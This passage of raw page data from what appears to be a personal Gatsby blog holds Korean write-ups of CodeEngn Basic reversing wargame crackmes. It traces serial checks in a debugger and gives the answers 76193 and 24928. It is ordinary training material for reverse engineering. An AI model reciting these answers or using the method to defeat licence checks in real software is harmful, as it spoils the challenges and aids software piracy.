url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACQElEQVR42m2SyW7bMBBAR5tj7QslSyS1SyS12HKcWFbanAr00P9puqBF+y9tgaLoVxZ2DkWC8MDDzDy8mcHApxR/ydNv09Rmmev7eZ4Pg9h2rZ9nyvsPcL+HPUAtwQRwA1AA6ADW+ZclGT5m9HORfZ12NaGu7zPGPM9xTN3BCX14iF7PEXMRD4ACbC5YBIABEMggwyuK70nyVrCUYBSGXHBNU2RZdh3nwJqOs+0w1mUBAJIkSfD/ybIMP/L0V5H93A6M0iCKyiKrypyxuijz3WEv+o7zyvUsy7ZMyzIMfa1fmaahG7qqKhDg2E82dSfSNEUIdYKXVTWO3XK6ubu7K6uCcda2dVFkZV1QiuuqbJoyzzMU+EBxkuK4F5wQEiDEOUswzjLS92JZFsabYeyr0qjKFSaqqqir1UpRznOtNA0wTgiOh6EjhPhBcDzNnucAQBhFp2VpWTPtd9O2fwzCs5kJiQlOBD+bHc/bTZNtmwCAEDrOM2NN14nbm2vHti47ewrjC8wZIwT7CO2vd4p8LgnD8LQsnDf766kqqaZpL5gxjjGOheCUENfzhnFQFfliDo/zzHkzjl1KQ1VVX2w7ITjphCAEu57POL+IIUThcZlbXnHRbsd+vb46R5+1HeN4g+NuHCilCPm2Yz/mUBjebg+ianvePV7IC+aaxA1JDn2fUeraNk2prq/PZieqvzf2O8sVLviXq4wBzKfwn4z8TcnvoWeU6pYZBL6iKgCwNiztTWXu4k0egAaSAWAAaE/gfyjfSMgJZ03hAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ff50afd9a846865abcff94307e88ae84/c9b55/7.webp 165w,\n/static/ff50afd9a846865abcff94307e88ae84/f2908/7.webp 330w,\n/static/ff50afd9a846865abcff94307e88ae84/3b1af/7.webp 412w\"\n              sizes=\"(max-width: 412px) 100vw, 412px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ff50afd9a846865abcff94307e88ae84/04c57/7.png 165w,\n/static/ff50afd9a846865abcff94307e88ae84/d9ecf/7.png 330w,\n/static/ff50afd9a846865abcff94307e88ae84/9e32a/7.png 412w\"\n            sizes=\"(max-width: 412px) 100vw, 412px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ff50afd9a846865abcff94307e88ae84/9e32a/7.png\"\n            alt=\"func\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>CodeEndn, 12345를 입력하고 진행시킨 결과이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 387px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 86.06060606060606%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAIAAABSJhvpAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB7ElEQVR42pVSz2/aMBh9MXZIICSEeCE/aAlx7AQotIVMkwqF7VxpV4amSVV32WmnSbv3z+hfOwEdawVC3ZMPlr/v+X3v2Th7ejp/fOSFxRJGJEEBhACHFmsIEV1ED/cP6/V6tVp9OQDK66tcyaJQZTmp10wA0PCM7cYwDEopjmJSTtJMFCprt13GNk3aFrvNjqzrOgCyxb66wfx2LqQYDIskOU8S4ftBGEZB2I7DIIrCIPAdxxGZ4J7rNJtpLxGZ8Dh/Ji+Xy1SkUspeL+gmdl7wKHY9z4vjgHOP8xbnns7YTpAQUqEVQshf8qePmcxGF8N+0Um6luPAMF75OuV5Np9JpQaDoiynShXaLiXtn/NT5PntQmSpEL3xaJgk5/uc3qS8WC4zKabTayXPGg3rsOEU+WY2k1LkeaZk12u5L5/5DeT5TBVS5aLfV3Ec/t/Ysw83WVdcDkdWrX60wTAMxtjh+Ubj8ueVeW86ucM6FC3AB94B9IiydnhBbSEqi6AzDKhPUQWa2/WaXDVNjRAQQqvVCqWM0aqub/5y7fsP3H0mKbQxQQQEQBuwsDffdN3xoB/YDd80RknXbzq2bXfi2LYbMH79rn/72orMzcwuQA5Gq9d9y3IAX9M4YL6spe9lOhC5yOIw1I8FcyLtP8njOl1K3mfeAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a7fa36ec14e62ab91810b25ba3abaacb/c9b55/8.webp 165w,\n/static/a7fa36ec14e62ab91810b25ba3abaacb/f2908/8.webp 330w,\n/static/a7fa36ec14e62ab91810b25ba3abaacb/bbd0d/8.webp 387w\"\n              sizes=\"(max-width: 387px) 100vw, 387px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a7fa36ec14e62ab91810b25ba3abaacb/04c57/8.png 165w,\n/static/a7fa36ec14e62ab91810b25ba3abaacb/d9ecf/8.png 330w,\n/static/a7fa36ec14e62ab91810b25ba3abaacb/691c3/8.png 387w\"\n            sizes=\"(max-width: 387px) 100vw, 387px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a7fa36ec14e62ab91810b25ba3abaacb/691c3/8.png\"\n            alt=\"calc result\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Name에 CodeEngn을 넣었을 시 그 연산 결과가 ESI에, 시리얼 값 12345에 대한 연산 결과는 함수 401383에 의해 연산 결과가 EAX에 담기는 것을 알 수 있다.</p>\n<p><img src=\"https://s01va.github.io/assets/images/2015-07-21-CodeEngn-Basic-12/9.png\" alt=\"ESI\"></p>\n<p>CodeEngn 문자열로 ESI 연산 알고리즘이 완료된 후의 레지스터 상태이다. ESI가 129A1임을 볼 수 있다. 129A1은 10진수로 76193이다.</p>\n<p><img src=\"https://s01va.github.io/assets/images/2015-07-21-CodeEngn-Basic-12/10.png\" alt=\"cracked\"></p>\n<p>이 값이 실제 시리얼 값임을 확인하였다.\r\n좀더 알고리즘을 파헤쳐서 해결하고자 한다면 다음과 같은 방법으로 풀 수도 있다. 다음은 입력한 시리얼 값으로 EAX를 생성해내는 함수 401383이다.</p>\n<p><img src=\"https://s01va.github.io/assets/images/2015-07-21-CodeEngn-Basic-12/11.png\" alt=\"function\"></p>\n<p>| (첫번째 문자열의 아스키 코드 – 30)*A^4 + (두번째 문자열의 아스키 코드 – 30)*A^3 + (세번째 문자열의 아스키 코드 – 30) * A^2 + … |</p>\n<p>이의 결과가 129A1과 같아야 한다. 이 연산결과에 맞는 값을 무작위 대입으로 알아내는 방법도 존재한다.</p>\n<p>정답: 76193</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":null,"id":"777f69f3-e114-5efd-982b-ea0aad14fc63","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-14/","title":"CodeEngn Basic 14","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/84d40ab84f39b44dd7d6e4ec74c02d93/f284b/0.png","srcSet":"/static/84d40ab84f39b44dd7d6e4ec74c02d93/37731/0.png 79w,\n/static/84d40ab84f39b44dd7d6e4ec74c02d93/f501b/0.png 158w,\n/static/84d40ab84f39b44dd7d6e4ec74c02d93/f284b/0.png 315w","sizes":"(min-width: 315px) 315px, 100vw"},"sources":[{"srcSet":"/static/84d40ab84f39b44dd7d6e4ec74c02d93/5511f/0.webp 79w,\n/static/84d40ab84f39b44dd7d6e4ec74c02d93/5179a/0.webp 158w,\n/static/84d40ab84f39b44dd7d6e4ec74c02d93/b1e9a/0.webp 315w","type":"image/webp","sizes":"(min-width: 315px) 315px, 100vw"}]},"width":660,"height":400.1904761904762}}}},"body":"<p>Name이 CodeEngn일때 Serial을 구하시오</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 315px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.545454545454554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABkUlEQVR42pXO7U7iQBQG4N7Z+rWuujEGFVIr8V5WwYgiLd0bMhvXaauVMEY+Cl3cFUtnhikDpNOG4sa0RBPjH3xyMsl5kzPnCNupre8ba2JmNyvtHWT30zuprCSKmXQ6vSOJmQNJykp7YmZ3dXlxZWlhVsuLX9a/fU1tbQr5XO6sUPipltWyopTOi4UTtSwrckmRS2W5pMqyqijyeTF/dPhWucMfJ8f54mlB6HYfzeuby8vfEN4xxjzPo5R6r+hry94bDAaMMaHRqNvt9kPnodt96s+NEIIQEqymxTl//v88jaJgbpxzSqnQ+WMbhvHr4gJcaU7P7c3HcZx4c6tlWZbVsqx22/7U2YQQodlsjsfj6TSaTCZhEITvBR+TMJjl/X5fsG2bUooQIvF3GGPsui5OEELiJRgjhN7COE/e+Oye44yGw7sqrNVqnc5fxhhCLucB9/1GrV6tQm/ARqMhxjgMQ9/36/f3/x6fJlEUDwMATNPUNKABoCcqlQqE0DAMXdc0AIwEhNC8vZ2Fuq5fJ14AFswbsAxjKegAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/84d40ab84f39b44dd7d6e4ec74c02d93/c9b55/0.webp 165w,\n/static/84d40ab84f39b44dd7d6e4ec74c02d93/6ea66/0.webp 315w\"\n              sizes=\"(max-width: 315px) 100vw, 315px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/84d40ab84f39b44dd7d6e4ec74c02d93/04c57/0.png 165w,\n/static/84d40ab84f39b44dd7d6e4ec74c02d93/6bdcf/0.png 315w\"\n            sizes=\"(max-width: 315px) 100vw, 315px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/84d40ab84f39b44dd7d6e4ec74c02d93/6bdcf/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음과 같이 Name과 Serial을 입력하여 인증하는 프로그램이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB90lEQVR42k2Q3W6bQBCFeczWwSRppaqqKveqD9DXSmuDSZ3EjmJYvIAL7D8LSwCzazf3lW2lyncxOnM0Mxod69P3H5PJZPLl87fJ16tLe3wxcuyRMz5VezS+eH8Wjj36cOU49ujaGdujdx+vL68c2/JvF0EQeK4397zZbDabTv353HU9fz6fTad3izvf972Z6/u30+mvuee5rrtY/F4/Pf28ubHKUhpj6rquqkopJWUlSsEYl7LiXNR1LatKSnkUZVlVNWNMqbppmk20sYqiKPKiLCXnPIYQIay13r9BlBJjVEopBC8KdDj8HYahbbs0TawkSSMQZXmBEXpcrTYw1lrvdrvhFUoZhDA/DUTRhnPeNI1SKgwCK8vyPMsJpRjhJE4IoX3fD8OgX+G8TLcpIQRjDACAEEopm6YBAJyW84JSyrlQSr28vOg3GGMIIUmSEoIpZVn2hxCqzb5tn+FmYylVa637rt+d6Lru/89nxxiz3++NMVrrw+FgjDmbGCMLhCEAURiEEMZ5lmGE+92u7/vuyPFie+LY9P1ZdF2ntUYIWajIwxBEUcQYp4SGIQiCkDL23DTr9TqOk7qu27aFME7TbVVVXddtt1vGxDHt1XL18HD/cH+/Wj1yzjHGCCHG2FljhIQQnPNjXBgLIQghy+USAHC3WPwDh8whriimdnsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e05ef7e9a47f473fb78525d0c601286a/c9b55/1.webp 165w,\n/static/e05ef7e9a47f473fb78525d0c601286a/f2908/1.webp 330w,\n/static/e05ef7e9a47f473fb78525d0c601286a/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e05ef7e9a47f473fb78525d0c601286a/04c57/1.png 165w,\n/static/e05ef7e9a47f473fb78525d0c601286a/d9ecf/1.png 330w,\n/static/e05ef7e9a47f473fb78525d0c601286a/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e05ef7e9a47f473fb78525d0c601286a/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD로 확인해 보니 별다른 패킹은 되어있지 않고 Delphi로 작성된 프로그램임을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 472px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAx0lEQVR42n3Ly26DMBCFYUgFsSugaoxofJ0ZY0iMMa3I+79blbDPtzibo78wxlhrY7yPYSRw3uMSY9M0xYsyJozUC4EIAM4B9H0/DIPWWghReE9IsP1uKS1zGO9xfjz2r647YkBc13iVP3nL+/6nlKyrqiyf13PxJa2LtQYJrTPTfAtTMFq1Xde27flcn04fVVUzzhlj5ZEeiJCQ8pa1UQAwBe9DWPOK4C7fl0/OizcA0ROlFJW6CiGmKQCAlFIbbZ3jjL2J/wHD+xfzSdafwQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f4cd78f1359f59a841e76da9dd5420fb/c9b55/2.webp 165w,\n/static/f4cd78f1359f59a841e76da9dd5420fb/f2908/2.webp 330w,\n/static/f4cd78f1359f59a841e76da9dd5420fb/ef93e/2.webp 472w\"\n              sizes=\"(max-width: 472px) 100vw, 472px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f4cd78f1359f59a841e76da9dd5420fb/04c57/2.png 165w,\n/static/f4cd78f1359f59a841e76da9dd5420fb/d9ecf/2.png 330w,\n/static/f4cd78f1359f59a841e76da9dd5420fb/3c5de/2.png 472w\"\n            sizes=\"(max-width: 472px) 100vw, 472px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f4cd78f1359f59a841e76da9dd5420fb/3c5de/2.png\"\n            alt=\"Delphi\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>string만 따로 찾아 정답 판별 여부를 나타내는 곳의 주소지를 찾았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.636363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA5UlEQVR42m2NPU/DMBiE3yT+9munaRKXJoWUOG4cVCgg6MDOwFIxMvIH+P8rCmVCPNLdDXfSwecuLN1q2Lb9XducfBVL9KgrZTSiQSkEzWYopZwzNotRQimlhBDo49i27fFpujnum/dTeShggkxkCYBUyrfN4OrQdcYarRQiWmuE4NZaRISd927lbvd9fBjCx+tiyPESlVFaa2vtUqkyTVWawr9MMXbdVRyvx3v/+PUmDwJGAD1XQspNVa6lvCgKxvl5nyTJ2ecIIdTO5VaLfFE/v2y264z9/jDGNGcCgBMCP+M/fANLEBLTCKPxfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/31d3c4bb0f95546c0d2f29e2ca4b148e/c9b55/3.webp 165w,\n/static/31d3c4bb0f95546c0d2f29e2ca4b148e/f2908/3.webp 330w,\n/static/31d3c4bb0f95546c0d2f29e2ca4b148e/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/31d3c4bb0f95546c0d2f29e2ca4b148e/04c57/3.png 165w,\n/static/31d3c4bb0f95546c0d2f29e2ca4b148e/d9ecf/3.png 330w,\n/static/31d3c4bb0f95546c0d2f29e2ca4b148e/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/31d3c4bb0f95546c0d2f29e2ca4b148e/32056/3.png\"\n            alt=\"JNE\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>458831에서 EAX와 45B844의 값과 같은지를 확인하여 정답 여부를 판별하는 것을 볼 수 있다. 프로그램을 실행하기 전이라 45B844는 비워져 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABBklEQVR42lXMy06DQBhA4b+RmVDqcJFyncGWmzAzUC3BUhbtwgS6MLFpdWnSvojvbjRu/BZneeAwDM163T63m6ZJdzv6cfRTy2Z2nmaCl4wx13UZY1Uli+JBCs6F4LxMktjzPPi8XsZxGMbh9TDuz6fy/JbwiMZh27Z9v+26rq7rx9VKVFXBRSn+SCnruoaKUhoE0XIReZ6z6Z3rxY5nZmhpqqYbOkIKAGCMNYwVgBv470sIHkXLLH4SWfZSBO9ynlt6TohDLNMi5BYAplMtpqFLyAxjRVEQQhhjhBCw5YJSGlJf5pG/rYzTHt9PIAZAv+/JT1RVpc7cUVXPMAzTJIQQndj23Tfq9SMG6noJcQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2c4f6fd0114ccb8a86e23a51270dcd0c/c9b55/4.webp 165w,\n/static/2c4f6fd0114ccb8a86e23a51270dcd0c/f2908/4.webp 330w,\n/static/2c4f6fd0114ccb8a86e23a51270dcd0c/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2c4f6fd0114ccb8a86e23a51270dcd0c/04c57/4.png 165w,\n/static/2c4f6fd0114ccb8a86e23a51270dcd0c/d9ecf/4.png 330w,\n/static/2c4f6fd0114ccb8a86e23a51270dcd0c/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2c4f6fd0114ccb8a86e23a51270dcd0c/32056/4.png\"\n            alt=\"JNE\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>적당한 위치에 BP를 걸고 Name에 CodeEngn, Serial에 임의의 값 12345를 넣어 실행시켰다. 함수 458760을 통과하자 CMP 분기문에서 EAX와 비교되는 45B844에 ASCII 값이 추가되는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.81818181818182%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABJklEQVR42n2PWW+CQBRG7wwozAybbLOAxW1wJCJK7JvaxKT//y81aGnS2PQ83LeT8124XC6323VX17rrlt3+/XwyjdG1rrf1E2NM0zRa6/oF4EJ4vgcAVlHG/WHmUQBACMEIxngymcCflGUplVAiTVaL6tQnVQAJWNLCAcaDiG3bdhwHIYRfAC7U8bi9Xk1jFn3b8XMOGtABIYl+ytPp9DlnZCxzLjiP48gO50XeNrJKwfo17b/ZWZ6vNstCJK6SdLuO50GYR1maRlH4TGCM/cAnxCWEUEoooY7rfMtCSGO0KvJC8nN3bHf7xVuV5alSMvD9QbZwGIWMUcoYY8NxXXeUpVqtq77Vm/uH+rwXOktUGgZhzrPZLHq8ihlj5JGmlA59QrwHXyqXHuBESUMOAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a32ce011c5bf9f9926c65ef8123364d3/c9b55/5.webp 165w,\n/static/a32ce011c5bf9f9926c65ef8123364d3/f2908/5.webp 330w,\n/static/a32ce011c5bf9f9926c65ef8123364d3/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a32ce011c5bf9f9926c65ef8123364d3/04c57/5.png 165w,\n/static/a32ce011c5bf9f9926c65ef8123364d3/d9ecf/5.png 330w,\n/static/a32ce011c5bf9f9926c65ef8123364d3/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a32ce011c5bf9f9926c65ef8123364d3/32056/5.png\"\n            alt=\"function 458760\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>458460 함수에 진입한 모습이다. 대강 Name인 CodeEngn 문자열만 가지고 시리얼 값을 생성하는 것을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 534px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.484848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABKElEQVR42lWPa0/CMBiF325rC+3WrR10N3RsxAvjon5SE0mMiYFBpkRYRCLfTPT//wJDNBrOx5OcPM+B991us3l9q7eTj+tBlRc3RdAL3J7rBkJ6Uip5eTGuqqosy3Vdr+p1tVyWi8VsNivLOfitVhiFitlqe+ft7llswglAAmDBQRBq+y1BsGtZDiWMc0oJdLPucDg462VHk8d8XoWnEl8RmlJsYYwtSqlpGAghQChNko7nZp7X73Qcx9mXWut+0T+OovT5IVpPVWSrrrKFbdtcCMeTkhC8BxuGJ0QTQACwP508z+IkpJg/fY5uv8bGOYYRQAHg/Nj+a2vfV6yhKPU5Z4xblglat7M8S6PAmS7slxXTABn6XR5+jrXWDRoTEnHWaDZNw/gG54IhhT6WcuYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c8f1ffc14f291baa3f4b633d3013ebeb/c9b55/6.webp 165w,\n/static/c8f1ffc14f291baa3f4b633d3013ebeb/f2908/6.webp 330w,\n/static/c8f1ffc14f291baa3f4b633d3013ebeb/29722/6.webp 534w\"\n              sizes=\"(max-width: 534px) 100vw, 534px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c8f1ffc14f291baa3f4b633d3013ebeb/04c57/6.png 165w,\n/static/c8f1ffc14f291baa3f4b633d3013ebeb/d9ecf/6.png 330w,\n/static/c8f1ffc14f291baa3f4b633d3013ebeb/a07a7/6.png 534w\"\n            sizes=\"(max-width: 534px) 100vw, 534px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c8f1ffc14f291baa3f4b633d3013ebeb/a07a7/6.png\"\n            alt=\"any serial\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼을 무엇을 입력하든 Name이 변하지 않는 한 CMP에서 EAX와 비교하는 45B844의 값은 변하지 않는 것을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 148px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.324324324324326%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABJ0lEQVR42jXGTUvCYAAA4J2aW/HO130ePIjOCV4Cw1C3uVc3Ff9WIdQxSMNpVhQdFIp9791mRzV/VRT0nB5im21dx/V8PwxCjHEUR0mSYow3m7Xn+XEcJWmaYOx7XhzHYRCmWfb1j3i0l7O7qb1YLezlarF8fnrZrD8O34f3t9fbyc18NnX8KPh0Hu5n9tyeXF27bnA8Hne73X6/J0bDkdnvI9SzrMHAskzTRAYaj8fDwVBVNVXtdFQNGajzS202m5qmI4SMbhcZBiHLcqlSVRS50Ti/aLWr5XK9rtTkUkWpIWRIogA5vt26hMwphGyv1wcA8Lyg610AAMEwDJPPw0KhACHLsgwALMdKklgsFjmeo2k6l8uJknBGUyRJiqJIkicURQl/+QEHYG0whS7RPwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a0c6b18c0dcac0c9fae3ced8c5827e9f/cbe2e/7.webp 148w\"\n              sizes=\"(max-width: 148px) 100vw, 148px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a0c6b18c0dcac0c9fae3ced8c5827e9f/12f09/7.png 148w\"\n            sizes=\"(max-width: 148px) 100vw, 148px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a0c6b18c0dcac0c9fae3ced8c5827e9f/12f09/7.png\"\n            alt=\"6061\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>45B844에는 6061이 들어있다(ASCII로는 `a인 듯 하다). 이를 little endian으로 해석한 6160을 십진수로 바꾸면 24928이다. 이것이 키 값임을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 519px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.15151515151515%; position: relative; bottom: 0; left: 0; background-image: 